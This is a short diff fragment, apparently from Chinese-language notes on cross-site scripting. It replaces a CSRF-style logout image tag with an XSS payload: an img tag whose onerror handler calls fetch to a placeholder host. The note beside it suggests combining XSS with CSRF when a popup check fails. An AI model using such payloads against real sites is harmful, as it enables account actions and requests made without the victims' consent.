@@ -60,7 +60,7 @@ Host: example.com
 若无法弹窗验证或者控制台验证可以尝试组合 CSRF 使用
 
 ```
-<img src="http://example.com/logout">
+<img/src/onerror=fetch("http://example.com")>
 ```
 
 ### 1.4. 常用触发事件
